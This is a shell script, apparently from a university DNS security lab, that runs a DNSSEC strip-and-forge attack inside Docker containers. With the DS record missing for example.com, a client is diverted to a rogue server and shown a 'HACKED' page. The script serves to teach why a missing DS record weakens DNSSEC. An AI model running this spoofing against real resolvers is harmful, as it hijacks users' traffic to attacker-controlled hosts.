#!/bin/sh
# Phase 4, Run B: com publishes NO DS for example.com. The operator signed the
# child but never gave the parent the DS, so the delegation is insecure. The
# SAME strip-and-forge attack now lands: the resolver treats example.com as
# unsigned, skips signature checks, and accepts the forged A. Client -> rogue.
set -e
cd "$(dirname "$0")/.."

echo "== sign (Run B: NO DS for example.com) =="
NODS="example.com" sh sign.sh

echo "== (re)deploy with the insecure delegation, on a clean cache =="
docker image inspect cs6008-dns-base >/dev/null 2>&1 || docker build -t cs6008-dns-base ../common/base
docker compose down -t 2 >/dev/null 2>&1 || true
MODE=strip docker compose up -d
echo "waiting for BIND..."; sleep 8
docker exec client dig +time=5 +tries=2 example.com >/dev/null 2>&1 || true   # prime root/com

echo
echo "== 4.2 baseline: no diversion, example.com now resolves INSECURE (no AD flag) =="
sh scripts/undivert.sh
sh scripts/flush.sh
docker exec client dig +dnssec example.com | grep -E "flags:|status:|IN[[:space:]]+A" | head -3

echo
echo "== 4.3 Run B attack: divert through the attacker (STRIP) and retry =="
sh scripts/divert.sh
sh scripts/flush.sh
printf 'client resolves example.com (expect 172.16.1.30 ROGUE) -> '
docker exec client dig +time=8 +tries=1 +short example.com
echo "-- fetch (expect the rogue HACKED page) --"
docker exec client curl -s http://example.com | grep -iE 'hacked|rogue' || true
sh scripts/undivert.sh
echo
echo "Run B done: the single missing DS reopened the Phase 2 forgery against a validating resolver."
